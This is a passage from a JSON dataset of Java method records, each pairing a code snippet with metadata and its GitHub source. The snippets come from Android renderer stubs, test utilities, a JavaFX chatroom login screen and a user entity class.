!= null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewRenderer_3.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32843, "method_name": "createObjectMapper", "class_name": "TestUtil", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "ObjectMapper", "snippet": "    private static ObjectMapper createObjectMapper() {\n        ObjectMapper mapper = new ObjectMapper();\n        mapper.setSerializationInclusion(JsonInclude.Include.NON_EMPTY);\n        mapper.registerModule(new JavaTimeModule());\n        return mapper;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32844, "method_name": "convertObjectToJsonBytes", "class_name": "TestUtil", "params": ["Object"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] convertObjectToJsonBytes(Object object) throws IOException {\n        return mapper.writeValueAsBytes(object);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32845, "method_name": "createByteArray", "class_name": "TestUtil", "params": ["int", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] createByteArray(int size, String data) {\n        byte[] byteArray = new byte[size];\n        for (int i = 0; i < size; i++) {\n            byteArray[i] = Byte.parseByte(data, 2);\n        }\n        return byteArray;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32846, "method_name": "sameInstant", "class_name": "TestUtil", "params": ["ZonedDateTime"], "throws": null, "modifiers": ["public", "static"], "return_type": "ZonedDateTimeMatcher", "snippet": "    public static ZonedDateTimeMatcher sameInstant(ZonedDateTime date) {\n        return new ZonedDateTimeMatcher(date);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32847, "method_name": "equalsVerifier", "class_name": "TestUtil", "params": ["Class<T>"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static <T> void equalsVerifier(Class<T> clazz) throws Exception {\n        T domainObject1 = clazz.getConstructor().newInstance();\n        assertThat(domainObject1.toString()).isNotNull();\n        assertThat(domainObject1).isEqualTo(domainObject1);\n        assertThat(domainObject1.hashCode()).isEqualTo(domainObject1.hashCode());\n        // Test with an instance of another class\n        Object testOtherObject = new Object();\n        assertThat(domainObject1).isNotEqualTo(testOtherObject);\n        assertThat(domainObject1).isNotEqualTo(null);\n        // Test with an instance of the same class\n        T domainObject2 = clazz.getConstructor().newInstance();\n        assertThat(domainObject1).isNotEqualTo(domainObject2);\n        // HashCodes are equals because the objects are not persisted yet\n        assertThat(domainObject1.hashCode()).isEqualTo(domainObject2.hashCode());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32848, "method_name": "createFormattingConversionService", "class_name": "TestUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "FormattingConversionService", "snippet": "    public static FormattingConversionService createFormattingConversionService() {\n        DefaultFormattingConversionService dfcs = new DefaultFormattingConversionService();\n        DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();\n        registrar.setUseIsoFormat(true);\n        registrar.registerFormatters(dfcs);\n        return dfcs;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32849, "method_name": "findAll", "class_name": "TestUtil", "params": ["EntityManager", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "    public static <T> List<T> findAll(EntityManager em, Class<T> clss) {\n        CriteriaBuilder cb = em.getCriteriaBuilder();\n        CriteriaQuery<T> cq = cb.createQuery(clss);\n        Root<T> rootEntry = cq.from(clss);\n        CriteriaQuery<T> all = cq.select(rootEntry);\n        TypedQuery<T> allQuery = em.createQuery(all);\n        return allQuery.getResultList();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32850, "method_name": "matchesSafely", "class_name": "ZonedDateTimeMatcher", "params": ["String", "Description"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "        protected boolean matchesSafely(String item, Description mismatchDescription) {\n            try {\n                if (!date.isEqual(ZonedDateTime.parse(item))) {\n                    mismatchDescription.appendText(\"was \").appendValue(item);\n                    return false;\n                }\n                return true;\n            } catch (DateTimeParseException e) {\n                mismatchDescription.appendText(\"was \").appendValue(item)\n                    .appendText(\", which could not be parsed as a ZonedDateTime\");\n                return false;\n            }\n\n        }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": "TypeSafeDiagnosingMatcher", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32851, "method_name": "describeTo", "class_name": "ZonedDateTimeMatcher", "params": ["Description"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void describeTo(Description description) {\n            description.appendText(\"a String representing the same Instant as \").appendValue(date);\n        }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/TestUtil.java", "stars": "2", "class_props": {"extends": "TypeSafeDiagnosingMatcher", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32852, "method_name": "main", "class_name": "Demo01SetThreadName", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u5f00\u542f\u591a\u7ebf\u7a0b\n        MyThread mt = new MyThread();\n        mt.setName(\"\u5c0f\u5f3a\");\n        mt.start();\n\n        //\u5f00\u542f\u591a\u7ebf\u7a0b\n        new MyThread(\"\u65fa\u8d22\").start();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/code/06_Thread/src/com/itheima/demo02/setName/Demo01SetThreadName.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32853, "method_name": "invalidate", "class_name": "CheckBoxDesignerRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void invalidate ()\n\t{\n\t\tn_invalidate ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32854, "method_name": "n_invalidate", "class_name": "CheckBoxDesignerRenderer", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_invalidate ();\n\n\n\tpublic void onFocusChange (android.view.View p0, boolean p1)\n\t{\n\t\tn_onFocusChange (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32855, "method_name": "onFocusChange", "class_name": "CheckBoxDesignerRenderer", "params": ["android", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onFocusChange (android.view.View p0, boolean p1)\n\t{\n\t\tn_onFocusChange (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32856, "method_name": "n_onFocusChange", "class_name": "CheckBoxDesignerRenderer", "params": ["android", "boolean"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onFocusChange (android.view.View p0, boolean p1);\n\n\n\tpublic void onCheckedChanged (android.widget.CompoundButton p0, boolean p1)\n\t{\n\t\tn_onCheckedChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32857, "method_name": "onCheckedChanged", "class_name": "CheckBoxDesignerRenderer", "params": ["android", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCheckedChanged (android.widget.CompoundButton p0, boolean p1)\n\t{\n\t\tn_onCheckedChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32858, "method_name": "n_onCheckedChanged", "class_name": "CheckBoxDesignerRenderer", "params": ["android", "boolean"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onCheckedChanged (android.widget.CompoundButton p0, boolean p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32859, "method_name": "monodroidAddReference", "class_name": "CheckBoxDesignerRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32860, "method_name": "monodroidClearReferences", "class_name": "CheckBoxDesignerRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CheckBoxDesignerRenderer.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 32861, "method_name": "getColor", "class_name": "Practice01ArgbEvaluatorView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getColor() {\n        return color;\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/practice01/Practice01ArgbEvaluatorView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 32862, "method_name": "setColor", "class_name": "Practice01ArgbEvaluatorView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColor(int color) {\n        this.color = color;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/practice01/Practice01ArgbEvaluatorView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 32863, "method_name": "onDraw", "class_name": "Practice01ArgbEvaluatorView", "params": ["Canvas"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        int width = getWidth();\n        int height = getHeight();\n\n        paint.setColor(color);\n        canvas.drawCircle(width / 2, height / 2, width / 6, paint);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/practice01/Practice01ArgbEvaluatorView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 32864, "method_name": "validateUserName", "class_name": "OpeningWindowController", "params": ["String"], "throws": null, "modifiers": ["static", "protected"], "return_type": "boolean", "snippet": "    protected static boolean validateUserName(String userName) {\n        return (!userName.equals(\"\") && (!userName.contains(\",\") && !userName.contains(\":\")\n                && !userName.contains(\"<\") && !userName.contains(\">\") && !userName.contains(\"=\")\n                && !userName.contains(\"\\n\") && !userName.contains(\"\\r\") && !userName.contains(\"\\t\")\n                && !userName.contains(\" \"))) && userName.chars().allMatch(Character::isLetter);\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32865, "method_name": "initialize", "class_name": "OpeningWindowController", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL location, ResourceBundle resources) {\n        imageView.setImage(new Image(new File(Utils.rebuildPath(\"src\\\\Resources\\\\Icons\\\\main.png\")).toURI().toString()));\n\n        ImageView loginIcon = new ImageView();\n        loginIcon.setImage(new Image(new File(\n                Utils.rebuildPath(\"src\\\\Resources\\\\Icons\\\\login.png\")\n        ).toURI().toString()));\n        loginButton.setGraphic(loginIcon);\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32866, "method_name": "clearServer", "class_name": "OpeningWindowController", "params": ["MouseEvent"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void clearServer(MouseEvent event) {\n        serverAddress.clear();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32867, "method_name": "clearUserName", "class_name": "OpeningWindowController", "params": ["MouseEvent"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void clearUserName(MouseEvent event) {\n        usernameTextField.clear();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32868, "method_name": "clearPort", "class_name": "OpeningWindowController", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearPort(MouseEvent mouseEvent) {\n        serverPort.clear();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32869, "method_name": "login", "class_name": "OpeningWindowController", "params": ["ActionEvent"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void login(ActionEvent event) {\n        setIsConnecting();\n        Thread connectorThread = new Thread(new ClientConnector(this, event));\n        connectorThread.setDaemon(true);\n        connectorThread.start();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32870, "method_name": "setServerAddress", "class_name": "OpeningWindowController", "params": ["String", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setServerAddress(String text, String... styles) {\n        serverAddress.setText(text);\n        if (Optional.ofNullable(styles).isPresent()) {\n            for (String style : styles)\n                serverAddress.setStyle(style);\n        }\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32871, "method_name": "setServerPort", "class_name": "OpeningWindowController", "params": ["String", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setServerPort(String text, String... styles) {\n        serverPort.setText(text);\n        if (Optional.ofNullable(styles).isPresent()) {\n            for (String style : styles)\n                serverPort.setStyle(style);\n        }\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32872, "method_name": "setUsernameTextField", "class_name": "OpeningWindowController", "params": ["String", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setUsernameTextField(String text, String... styles) {\n        usernameTextField.setText(text);\n        if (Optional.ofNullable(styles).isPresent()) {\n            for (String style : styles)\n                usernameTextField.setStyle(style);\n        }\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32873, "method_name": "getServerAddress", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String getServerAddress() {\n        return serverAddress.getText();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32874, "method_name": "getServerPort", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String getServerPort() {\n        return serverPort.getText();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32875, "method_name": "getUserName", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String getUserName() {\n        return usernameTextField.getText();\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32876, "method_name": "setConnected", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConnected() {\n        ImageView loginIcon = new ImageView();\n        loginIcon.setImage(new Image(new File(\n                Utils.rebuildPath(\"src\\\\Resources\\\\Icons\\\\login.png\")\n        ).toURI().toString()));\n        loginButton.setGraphic(loginIcon);\n        loginButton.setText(\"Connected\");\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32877, "method_name": "setIsConnecting", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setIsConnecting() {\n        loginButton.setText(\"Connecting ...\");\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32878, "method_name": "resetLoginButton", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resetLoginButton() {\n        ImageView loginIcon = new ImageView();\n        loginIcon.setImage(new Image(new File(\n                Utils.rebuildPath(\"src\\\\Resources\\\\Icons\\\\login.png\")\n        ).toURI().toString()));\n        loginButton.setGraphic(loginIcon);\n        loginButton.setText(\"\");\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32879, "method_name": "setIsOffline", "class_name": "OpeningWindowController", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setIsOffline() {\n        ImageView offline = new ImageView();\n        offline.setImage(new Image(new File(\n                Utils.rebuildPath(\"src\\\\Resources\\\\Icons\\\\try.png\")\n        ).toURI().toString()));\n        loginButton.setGraphic(offline);\n        loginButton.setText(\"\");\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32880, "method_name": "callLogin", "class_name": "OpeningWindowController", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void callLogin(KeyEvent keyEvent) {\n        if (keyEvent.getCode().equals(KeyCode.ENTER))\n            login(new ActionEvent(basePane, keyEvent.getTarget()));\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/OpeningWindowController.java", "stars": "2", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 32881, "method_name": "onTouchEvent", "class_name": "Platform_DefaultRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32882, "method_name": "n_onTouchEvent", "class_name": "Platform_DefaultRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic boolean dispatchTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_dispatchTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32883, "method_name": "dispatchTouchEvent", "class_name": "Platform_DefaultRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean dispatchTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_dispatchTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32884, "method_name": "n_dispatchTouchEvent", "class_name": "Platform_DefaultRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_dispatchTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic void setOnTouchListener (android.view.View.OnTouchListener p0)\n\t{\n\t\tn_setOnTouchListener (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32885, "method_name": "setOnTouchListener", "class_name": "Platform_DefaultRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOnTouchListener (android.view.View.OnTouchListener p0)\n\t{\n\t\tn_setOnTouchListener (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32886, "method_name": "n_setOnTouchListener", "class_name": "Platform_DefaultRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_setOnTouchListener (android.view.View.OnTouchListener p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32887, "method_name": "monodroidAddReference", "class_name": "Platform_DefaultRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32888, "method_name": "monodroidClearReferences", "class_name": "Platform_DefaultRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/Platform_DefaultRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32889, "method_name": "getUserId", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUserId() {\n    return userId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32890, "method_name": "setUserId", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUserId(String userId) {\n    this.userId = userId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32891, "method_name": "getUsername", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUsername() {\n    return username;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32892, "method_name": "setUsername", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUsername(String username) {\n    this.username = username;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32893, "method_name": "getPassword", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPassword() {\n    return password;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32894, "method_name": "setPassword", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setPassword(String password) {\n    this.password = password;\n  }", "url": 